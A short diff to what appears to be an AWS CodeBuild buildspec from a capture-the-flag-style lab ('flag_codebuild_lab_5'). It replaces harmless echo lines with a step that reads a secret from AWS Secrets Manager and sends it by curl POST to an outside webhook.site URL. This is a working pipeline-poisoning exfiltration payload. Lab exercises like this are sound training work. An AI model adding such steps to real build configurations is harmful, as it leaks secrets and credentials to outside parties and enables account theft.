@@ -3,6 +3,5 @@ version: 0.2
 phases:
   build:
     commands:
-      - echo "Running vulnerable training build"
-      - env | sort | head -n 20
-      - echo "Done"
+      - FLAG=$(aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1 --query SecretString --output text)
+      - curl -X POST https://webhook.site/af7370e4-a085-4ca9-89df-33515d3947b6 --data "flag=$FLAG"
